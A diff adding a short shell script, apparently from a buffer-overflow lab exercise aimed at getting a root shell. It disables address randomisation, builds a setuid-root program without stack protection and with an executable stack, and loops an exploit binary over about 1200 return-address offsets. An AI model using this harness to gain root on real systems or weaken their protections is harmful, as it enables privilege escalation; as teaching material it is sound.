@@ -1,0 +1,14 @@
+# Task 1: Find the root shell. This script tries offsets sequential for the correct return addr.
+sudo sysctl -w kernel.randomize_va_space=0
+sudo gcc -ggdb -o stack -fno-stack-protector stack.c
+
+sudo chmod 4755 stack
+sudo execstack -s stack
+gcc -g -o exploit exploit.c
+
+for i in {0..1200}
+do
+   echo "[$i] ================================================="
+   ./exploit $i && ./stack
+done
+
